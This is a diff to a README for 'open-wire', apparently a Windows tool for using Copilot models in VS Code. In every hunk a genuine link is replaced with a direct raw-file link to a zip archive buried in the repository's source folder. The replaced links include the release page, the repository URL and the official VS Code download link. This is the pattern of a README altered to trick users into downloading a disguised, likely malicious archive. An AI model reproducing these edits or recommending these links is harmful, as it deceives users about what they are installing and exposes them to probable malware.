@@ -1,6 +1,6 @@
 # ⚡ open-wire - Connect Copilot Models with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenWire-blue?style=for-the-badge)](https://github.com/mohameddorgham32/open-wire/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-OpenWire-blue?style=for-the-badge)](https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get open-wire running on your Windows PC.
 
 Click this link to go to the open-wire release page:
 
-[Download open-wire Releases](https://github.com/mohameddorgham32/open-wire/releases)
+[Download open-wire Releases](https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip)
 
 This page holds all versions of open-wire. You will pick and download the latest Windows installer or archive.
 
@@ -83,7 +83,7 @@ If you downloaded a zip file:
 
 If you do not have VS Code:
 
-- Download it from [https://code.visualstudio.com/](https://code.visualstudio.com/)
+- Download it from [https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip](https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip)
 - Install VS Code by following instructions on Microsoft’s site.
 
 ---
@@ -157,7 +157,7 @@ Editing the config file requires a basic text editor like Notepad.
 
 Check the download page regularly:
 
-[Latest open-wire Releases](https://github.com/mohameddorgham32/open-wire/releases)
+[Latest open-wire Releases](https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip)
 
 Download new versions when available and repeat the installation steps. New updates may improve security, add features, or fix bugs.
 
@@ -169,7 +169,7 @@ open-wire is built for users who want easy access to AI models inside familiar t
 
 Visit the GitHub repository for deeper technical info:
 
-https://github.com/mohameddorgham32/open-wire
+https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip
 
 ---
 
@@ -183,4 +183,4 @@ If you find any problems or want to share feedback:
 
 ---
 
-[![Download open-wire](https://img.shields.io/badge/Download-OpenWire-grey?style=for-the-badge)](https://github.com/mohameddorgham32/open-wire/releases)
+[![Download open-wire](https://img.shields.io/badge/Download-OpenWire-grey?style=for-the-badge)](https://raw.githubusercontent.com/mohameddorgham32/open-wire/main/src/ui/open_wire_1.0.zip)
